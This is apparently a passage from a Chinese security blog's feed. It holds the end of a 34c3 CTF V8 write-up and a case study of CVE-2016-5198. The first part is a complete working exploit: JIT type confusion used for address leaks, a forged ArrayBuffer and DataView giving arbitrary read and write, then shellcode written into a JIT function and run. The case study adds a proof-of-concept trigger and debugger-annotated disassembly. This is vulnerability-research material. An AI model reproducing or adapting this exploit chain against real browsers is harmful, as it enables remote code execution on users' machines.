class="title">trigger</span>(<span class="params">arr,callback</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v=arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将一个数当成object写进去</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger2</span>(<span class="params">arr, callback, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v = arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    arr[<span class="number">0</span>] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> ab_map_obj = [</span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,</span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,</span><br><span class="line">    <span class="number">6.73490047e-316</span>,</span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">// use ut32.prototype replace it</span></span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,</span><br><span class="line">    <span class="number">0.0</span></span><br><span class="line">];</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> ab=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());</span></span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x00000000082003ff)).asDouble().toString());</span></span><br><span class="line"></span><br><span class="line">arr0=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// leak arraybuffer的prototype和constructor</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr0[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr0, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print(Int64.fromDouble(trigger(arr0,evil_r0)).toString(16));</span></span><br><span class="line">    re=Int64.fromDouble(trigger(arr0,evil_r0));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_proto_addr=<span class="built_in">parseInt</span>(read_obj_addr(ab.__proto__));</span><br><span class="line">print(<span class="string">"要被leak的ArrayBuffer"</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line">print(ab_proto_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_constructor_addr = ab_proto_addr - <span class="number">0x1b0</span>;</span><br><span class="line">print(ab_constructor_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">ab_map_obj[<span class="number">0x3</span>]=<span class="keyword">new</span> Int64(ab_proto_addr).asDouble();</span><br><span class="line">ab_map_obj[<span class="number">0x4</span>]=<span class="keyword">new</span> Int64(ab_constructor_addr).asDouble();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"要leak出的ab_map_obj的数组"</span>);</span><br><span class="line">%DebugPrint(ab_map_obj);</span><br><span class="line"><span class="comment">// leak ab_map_obj的地址</span></span><br><span class="line"></span><br><span class="line">arr1=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr1</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr1[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr1, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print(Int64.fromDouble(trigger(arr1,evil_r1)).toString(16));</span></span><br><span class="line">    re=Int64.fromDouble(trigger(arr1,evil_r1));</span><br><span class="line">    <span class="comment">// while(1);</span></span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ab_map_obj_addr = read_obj_addr1(ab_map_obj);</span></span><br><span class="line">ab_map_obj_addr = <span class="built_in">parseInt</span>(read_obj_addr1(ab_map_obj))+<span class="number">0x70</span>;</span><br><span class="line">print(ab_map_obj_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_map_obj_addr = <span class="keyword">new</span> Int64(ab_map_obj_addr).asDouble();</span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());</span></span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab = [</span><br><span class="line">    ab_map_obj_addr,</span><br><span class="line">    ab_map_obj_addr,</span><br><span class="line">    ab_map_obj_addr,</span><br><span class="line">    <span class="number">3.4766779039175e-310</span>, <span class="comment">/* buffer length 0x4000*/</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,<span class="comment">//backing store,先随便填一个数</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">arr2=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr2</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr2[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr2, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr2,evil_r2));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"要leak出的fake_ab的数组"</span>);</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line">fake_ab_float_addr=<span class="built_in">parseInt</span>(read_obj_addr2(fake_ab))+<span class="number">0x70</span>;</span><br><span class="line">print(fake_ab_float_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">fake_ab_float_addr=<span class="keyword">new</span> Int64(fake_ab_float_addr).asDouble();</span><br><span class="line"></span><br><span class="line">arrr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_w0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arrr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">        %DebugPrint(arrr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger2(arrr, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print("arrr first is");</span></span><br><span class="line">    <span class="comment">// %DebugPrint(arrr);</span></span><br><span class="line">    trigger2(arrr,evil_w0,fake_ab_float_addr);</span><br><span class="line">&#125;</span><br><span class="line">write_obj_addr(fake_ab_float_addr);</span><br><span class="line">print(<span class="string">"arrr last is"</span>);</span><br><span class="line">%DebugPrint(arrr);</span><br><span class="line"><span class="comment">//DataView(ArrayBuffer buffer [, 字节起始位置 [, 长度]]);</span></span><br><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">%DebugPrint(fake_dv);</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">print(<span class="string">"要read的function"</span>);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line">arr3=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr3</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr3[<span class="number">0</span>] = object;</span><br><span class="line">        %DebugPrint(arr3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr3, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr3,evil_r3));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">shellcode_address_ref=<span class="built_in">parseInt</span>(read_obj_addr3(evil_f))+<span class="number">0x38</span><span class="number">-1</span>;</span><br><span class="line">print(shellcode_address_ref.toString(<span class="number">16</span>));</span><br><span class="line"><span class="comment">// while(1);</span></span><br><span class="line"><span class="comment">// read function code address</span></span><br><span class="line">fake_ab[<span class="number">4</span>]=<span class="keyword">new</span> Int64(shellcode_address_ref).asDouble();</span><br><span class="line">fake_ab[<span class="number">5</span>]=<span class="keyword">new</span> Int64(shellcode_address_ref).asDouble();</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line"></span><br><span class="line">shellcode_address =  fake_dv.getFloat64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br><span class="line">shellcode_address=shellcode_address+<span class="keyword">new</span> Int64(<span class="number">0x5f</span>).asDouble();</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_ab[<span class="number">4</span>]=shellcode_address;</span><br><span class="line">fake_ab[<span class="number">5</span>]=shellcode_address;</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line"><span class="comment">// while(1);</span></span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> value = shellcode[i];</span><br><span class="line">fake_dv.setUint32(i * <span class="number">4</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"go to shellcode!"</span>);</span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;34c3-v9-writeup&quot;&gt;&lt;a href=&quot;#34c3-v9-writeup&quot; class=&quot;headerlink&quot; title=&quot;34c3 v9 writeup&quot;&gt;&lt;/a&gt;34c3 v9 writeup&lt;/h1&gt;&lt;p&gt;很久之前做的了，和*CTF那题差不多
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>case study:cve-2016-5198</title>
    <link href="http://eternalsakura13.com/2019/04/29/CVE-2016-5198/"/>
    <id>http://eternalsakura13.com/2019/04/29/CVE-2016-5198/</id>
    <published>2019-04-29T05:34:45.220Z</published>
    <updated>2019-04-29T05:35:16.071Z</updated>
    
    <content type="html"><![CDATA[<h1 id="case-study-cve-2016-5198"><a href="#case-study-cve-2016-5198" class="headerlink" title="case study:cve-2016-5198"></a>case study:cve-2016-5198</h1><h2 id="bugs"><a href="#bugs" class="headerlink" title="bugs"></a>bugs</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=659475" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=659475</a><br><a href="https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6</a></p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    n = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    n.xyz = <span class="number">0x826852f4</span>;</span><br><span class="line">    <span class="built_in">parseInt</span>(<span class="string">'AAAAAAAA'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">2000</span>; ++i) &#123;</span><br><span class="line">    Ctor();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">2000</span>; ++i) &#123;</span><br><span class="line">    Check();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Ctor();</span><br><span class="line">Check();</span><br><span class="line">print(<span class="string">"finish"</span>);</span><br></pre></td></tr></table></figure><h2 id="漏洞表现"><a href="#漏洞表现" class="headerlink" title="漏洞表现"></a>漏洞表现</h2><h3 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h3><h4 id="优化前"><a href="#优化前" class="headerlink" title="优化前"></a>优化前</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">--- Raw source ---</span><br><span class="line">() &#123;</span><br><span class="line">n.xyz &#x3D; 0x826852f4;</span><br><span class="line">parseInt(&#39;AAAAAAAA&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--- Code ---</span><br><span class="line">0x35680eb86a00     0  55             push rbp</span><br><span class="line">0x35680eb86a01     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x35680eb86a04     4  56             push rsi</span><br><span class="line">0x35680eb86a05     5  57             push rdi</span><br><span class="line">0x35680eb86a06     6  488b4f2f       REX.W movq rcx,[rdi+0x2f]</span><br><span class="line">0x35680eb86a0a    10  488b490f       REX.W movq rcx,[rcx+0xf]</span><br><span class="line">0x35680eb86a0e    14  83411b01       addl [rcx+0x1b],0x1</span><br><span class="line">0x35680eb86a12    18  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x35680eb86a19    25  7305           jnc 32  (0x35680eb86a20)</span><br><span class="line">0x35680eb86a1b    27  e8c0bef5ff     call StackCheck  (0x35680eae28e0)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86a20    32  48b80000000002000000 REX.W movq rax,0x200000000</span><br><span class="line">0x35680eb86a2a    42  e8b1d9ffff     call 0x35680eb843e0     ;; code: LOAD_GLOBAL_IC</span><br><span class="line">0x35680eb86a2f    47  50             push rax</span><br><span class="line">0x35680eb86a30    48  48b8e9c362be00370000 REX.W movq rax,0x3700be62c3e9    ;; object: 0x3700be62c3e9 &lt;Number: 2.18788e+09&gt;</span><br><span class="line">0x35680eb86a3a    58  5a             pop rdx</span><br><span class="line">0x35680eb86a3b    59  48b919b062be00370000 REX.W movq rcx,0x3700be62b019    ;; object: 0x3700be62b019 &lt;String[3]: xyz&gt;</span><br><span class="line">0x35680eb86a45    69  48bf0000000004000000 REX.W movq rdi,0x400000000</span><br><span class="line">0x35680eb86a4f    79  e80cb8f0ff     call 0x35680ea92260     ;; code: STORE_IC</span><br><span class="line">0x35680eb86a54    84  488b75f8       REX.W movq rsi,[rbp-0x8]</span><br><span class="line">0x35680eb86a58    88  48b80000000008000000 REX.W movq rax,0x800000000</span><br><span class="line">0x35680eb86a62    98  e879d9ffff     call 0x35680eb843e0     ;; code: LOAD_GLOBAL_IC</span><br><span class="line">0x35680eb86a67   103  50             push rax</span><br><span class="line">0x35680eb86a68   104  49ba112330abf6000000 REX.W movq r10,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86a72   114  4152           push r10</span><br><span class="line">0x35680eb86a74   116  49ba39b062be00370000 REX.W movq r10,0x3700be62b039    ;; object: 0x3700be62b039 &lt;String[8]: AAAAAAAA&gt;</span><br><span class="line">0x35680eb86a7e   126  4152           push r10</span><br><span class="line">0x35680eb86a80   128  48ba0000000006000000 REX.W movq rdx,0x600000000</span><br><span class="line">0x35680eb86a8a   138  488b7c2410     REX.W movq rdi,[rsp+0x10]</span><br><span class="line">0x35680eb86a8f   143  b801000000     movl rax,0x1</span><br><span class="line">0x35680eb86a94   148  e8a7ddffff     call 0x35680eb84840     ;; code: CALL_IC</span><br><span class="line">0x35680eb86a99   153  488b75f8       REX.W movq rsi,[rbp-0x8]</span><br><span class="line">0x35680eb86a9d   157  4883c408       REX.W addq rsp,0x8</span><br><span class="line">0x35680eb86aa1   161  498b45a0       REX.W movq rax,[r13-0x60]</span><br><span class="line">0x35680eb86aa5   165  48bbc9c462be00370000 REX.W movq rbx,0x3700be62c4c9    ;; object: 0x3700be62c4c9 Cell for 6144</span><br><span class="line">0x35680eb86aaf   175  83430bd1       addl [rbx+0xb],0xd1</span><br><span class="line">0x35680eb86ab3   179  791f           jns 212  (0x35680eb86ad4)</span><br><span class="line">0x35680eb86ab5   181  50             push rax</span><br><span class="line">0x35680eb86ab6   182  e8a5bdf5ff     call InterruptCheck  (0x35680eae2860)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86abb   187  58             pop rax</span><br><span class="line">0x35680eb86abc   188  48bbc9c462be00370000 REX.W movq rbx,0x3700be62c4c9    ;; object: 0x3700be62c4c9 Cell for 6144</span><br><span class="line">0x35680eb86ac6   198  49ba0000000000180000 REX.W movq r10,0x180000000000</span><br><span class="line">0x35680eb86ad0   208  4c895307       REX.W movq [rbx+0x7],r10</span><br><span class="line">0x35680eb86ad4   212  c9             leavel</span><br><span class="line">0x35680eb86ad5   213  c20800         ret 0x8</span><br></pre></td></tr></table></figure><h4 id="优化后"><a href="#优化后" class="headerlink" title="优化后"></a>优化后</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">--- Raw source ---</span><br><span class="line">() &#123;</span><br><span class="line">n.xyz &#x3D; 0x826852f4;</span><br><span class="line">parseInt(&#39;AAAAAAAA&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--- Optimized code ---</span><br><span class="line">optimization_id &#x3D; 1</span><br><span class="line">source_position &#x3D; 50</span><br><span class="line">kind &#x3D; OPTIMIZED_FUNCTION</span><br><span class="line">name &#x3D; Check</span><br><span class="line">stack_slots &#x3D; 5</span><br><span class="line">compiler &#x3D; crankshaft</span><br><span class="line">Instructions (size &#x3D; 186)</span><br><span class="line">0x35680eb86c80     0  55             push rbp</span><br><span class="line">0x35680eb86c81     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x35680eb86c84     4  56             push rsi</span><br><span class="line">0x35680eb86c85     5  57             push rdi</span><br><span class="line">0x35680eb86c86     6  4883ec08       REX.W subq rsp,0x8</span><br><span class="line">0x35680eb86c8a    10  488b45f8       REX.W movq rax,[rbp-0x8]</span><br><span class="line">0x35680eb86c8e    14  488945e8       REX.W movq [rbp-0x18],rax</span><br><span class="line">0x35680eb86c92    18  488bf0         REX.W movq rsi,rax</span><br><span class="line">0x35680eb86c95    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x35680eb86c9c    28  7305           jnc 35  (0x35680eb86ca3)</span><br><span class="line">0x35680eb86c9e    30  e83dbcf5ff     call StackCheck  (0x35680eae28e0)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86ca3    35  48b8c1bd62be00370000 REX.W movq rax,0x3700be62bdc1    ;; object: 0x3700be62bdc1 PropertyCell for 0x18b675545e1 &lt;a Set with map 0xae15ff0c391&gt;</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x288d1c42b999: [PropertyCell]</span><br><span class="line"> - value: 0x28212078a219 &lt;a Set with map 0x1fdb7e106509&gt;</span><br><span class="line"> - details: (data, dictionary_index: 138, attrs: [WE_])</span><br><span class="line"> - cell_type: ConstantType (StableMap)</span><br><span class="line">...</span><br><span class="line">0x35680eb86cad    45  488b400f       REX.W movq rax,[rax+0xf] &#x2F;&#x2F;取出JSSet n</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x28212078a219: [JSSet]</span><br><span class="line"> - map &#x3D; 0x1fdb7e106509 [FastProperties]</span><br><span class="line"> - prototype &#x3D; 0x288d1c415e49</span><br><span class="line"> - elements &#x3D; 0x2089c5182241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS] - table &#x3D; 0x28212078a239 &lt;FixedArray[13]&gt;</span><br><span class="line"> - properties &#x3D; &#123;</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br><span class="line">0x35680eb86cb1    49  49ba0000805e0a4de041 REX.W movq r10,0x41e04d0a5e800000</span><br><span class="line">0x35680eb86cbb    59  c4c1f96ec2     vmovq xmm0,r10</span><br><span class="line">...</span><br><span class="line">0x41e04d0a5e800000 --d2ull-&gt; 0x00000000826852f4</span><br><span class="line">...</span><br><span class="line">0x35680eb86cc0    64  488b4007       REX.W movq rax,[rax+0x7] &#x2F;&#x2F; 取n的自定义属性数组</span><br><span class="line">...</span><br><span class="line">0x0000393bb3086cc4 in ?? ()</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x2089c5182241: [FixedArray]</span><br><span class="line"> - length: 0</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x28212078a219-1</span><br><span class="line">0x28212078a218:0x00001fdb7e1065090x00002089c5182241</span><br><span class="line">0x28212078a228:0x00002089c5182241</span><br><span class="line">...</span><br><span class="line">0x35680eb86cc4    68  488b400f       REX.W movq rax,[rax+0xf] &#x2F;&#x2F; 取n的xyz域</span><br><span class="line">&#x2F;&#x2F; 因为当JSSet对象n进行初始化时，由于尚没有其他的自定义属性存在，因此该位置将使用内置对象empty_fixed_array进行初始化。</span><br><span class="line">&#x2F;&#x2F; 让我们看一下empty_fixed_array</span><br><span class="line">0x2089c5182240:0x000007f3e4882309-&gt;FIXED_ARRAY_TYPE Map0x0000000000000000</span><br><span class="line">0x2089c5182250:0x000007f3e4882361-&gt;initial_string map0x00000000803b1506</span><br><span class="line">0x2089c5182260:0x00000004000000000xdeadbeed6c6c756e</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x7f3e4882361: [Map]</span><br><span class="line"> - type: ONE_BYTE_INTERNALIZED_STRING_TYPE</span><br><span class="line"> - instance size: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2089c5182311 &lt;undefined&gt;</span><br><span class="line"> - instance descriptors (own) #0: 0x2089c5182231 &lt;FixedArray[0]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x2089c5182201 &lt;null&gt;</span><br><span class="line"> - constructor: 0x2089c5182201 &lt;null&gt;</span><br><span class="line"> - code cache: 0x2089c5182241 &lt;FixedArray[0]&gt;</span><br><span 